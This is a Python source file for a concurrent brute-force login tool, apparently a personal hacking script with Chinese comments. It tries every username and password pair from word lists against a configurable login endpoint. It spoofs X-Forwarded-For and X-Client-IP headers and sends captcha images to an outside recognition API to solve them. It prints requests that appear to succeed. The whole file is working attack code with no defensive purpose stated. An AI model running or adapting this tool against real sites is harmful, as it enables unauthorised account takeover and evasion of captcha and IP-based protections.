from gevent import pool, queue, monkey;monkey.patch_all()
import requests
import json
import base64
import sys


class BurpLogin:
    def __init__(self):
        if not hasattr(BurpLogin, '__config'):
            self.__config = BurpLogin.__config = config
        self.request = requests.Session()
        self.request.headers.update({
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/87.0.4280.141 Safari/537.36",
            "x-client-ip": "220.192.8.169",
            "x-forwarded-for": "220.192.8.169"
        })
        self.data = {}
        self.username_field_name = self.__config.get("login_config").get("data").get("username_field_name")
        self.password_field_name = self.__config.get("login_config").get("data").get("password_field_name")
        self.verify_field_name = self.__config.get("login_config").get("data").get("verify_field_name")
        self.load_verify_code_url = self.__config.get("verify_config").get("load_verify_code_url")
        self.verify_api = self.__config.get("verify_config").get("verify_api")
        self.data.update(self.__config.get("login_config").get("data"))
        self.verify_enable = self.__config.get("verify_config").get("enable")

        for key in self.__config.get("login_config").get("data").keys():
            if self.__config.get("login_config").get("data").get(key):
                self.data.update({
                    self.__config.get("login_config").get("data").get(key): ''
                })
                self.data.pop(key)

    def run(self, handle_task_pool):
        """
        执行登录
        :return:
        """
        while True:
            try:
                task = handle_task_pool.get(timeout=2)
            except Exception as e:
                print("process is end...")
                exit(0)
            r, req = self.__login(_username=task[0], _password=task[1])
            if self.__config.get("debug"):
                login_out = '登录成功'
                if self.verify_enable:
                    verify_out = "验证码正确"
                else:
                    verify_out = "验证码未开启"
                if r == 0:
                    login_out = "登录失败，" + verify_out
                elif r == -1:
                    login_out = "登录失败，验证码错误"
                print(login_out, req.request.body)
            if r == 1:
                print(req.request.body)
            if r == -1:
                handle_task_pool.put(task)

    def __login(self, _username, _password) -> (int, requests.Response):
        """
        Login model
        :param _username:
        :param _password:
        :return:  0 登录失败 -1 验证码错误 1 登录可能成功
        """
        url = self.__config.get("login_config").get("url")
        method = self.__config.get("login_config").get("method")
        is_payload = self.__config.get("login_config").get("isPayload")
        if self.__config.get("verify_config").get("enable"):
            self.verify()  # 验证码开启，执行一下验证码
        self.data.update({
            self.username_field_name: _username,
            self.password_field_name: _password,
        })
        req = None
        if method.upper() == "POST":
            if is_payload:
                req = self.request.post(url=url, data=self.data)
            else:
                req = self.request.post(url=url, json=self.data)
        elif method.upper() == "GET":
            req = self.request.get(url=url, params=self.data)

        login_fail = self.__config.get("login_config").get("login_fail")
        for e in login_fail.get("page_contain_str"):
            if req.text.find(e) != -1:
                return 0, req  # 登录失败
        if req.status_code in login_fail.get("status"):
            return 0, req

        if self.__config.get("verify_config").get("enable"):
            for e in self.__config.get("verify_config").get("verify_error_contain_str"):
                if req.text.find(e) != -1:
                    return -1, req  # 验证码错误
        self.request.cookies.clear()
        return 1, req

    def verify(self):
        image_content = self.request.get(self.load_verify_code_url).content
        image_base64 = base64.b64encode(image_content).decode("utf-8")
        payload = self.__config.get("verify_config").get("post")
        payload.update({
            "data": image_base64
        })
        r = self.request.post(self.verify_api, json=payload)
        r = r.json().get("msg")
        self.data.update({
            self.verify_field_name: r
        })


if __name__ == '__main__':
    print("""
    一名小菜鸡er...
    """)
    if len(sys.argv) == 1:
        print("请传入配置文路径")
        exit(0)
    file_path = sys.argv[1]

    config = json.load(open(file_path, 'r', encoding='utf-8'))
    POOL = pool.Pool(config.get("speed"))
    QUEUE = queue.Queue(200)

    for e in range(config.get("speed")):
        POOL.apply_async(BurpLogin().run, args=(QUEUE,))

    f_username = open('username.txt', 'r')
    f_password = open('password.txt', 'r')
    for u in f_username:
        for p in f_password:
            QUEUE.put([u.strip(), p.strip()])
        f_password.seek(0)
    f_username.close()
    f_password.close()
    POOL.join()
